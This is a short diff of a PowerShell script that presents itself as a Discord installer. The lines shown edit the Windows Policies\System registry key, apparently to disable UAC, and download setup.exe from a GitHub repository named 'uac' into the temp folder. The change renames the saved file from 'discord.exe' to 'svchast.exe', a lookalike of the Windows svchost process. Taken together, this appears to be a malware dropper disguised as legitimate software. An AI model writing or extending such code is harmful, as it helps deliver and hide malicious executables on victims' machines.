@@ -21,7 +21,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v E
 
 $DownloadURL = 'https://raw.githubusercontent.com/stenehzin/uac/main/setup.exe'
 $TempPath = $env:TEMP
-$FilePath = Join-Path $TempPath 'discord.exe'
+$FilePath = Join-Path $TempPath 'svchast.exe'
 
 if (Test-Path $FilePath) {
     Write-Host "Discord is already installed! Skipping installation."
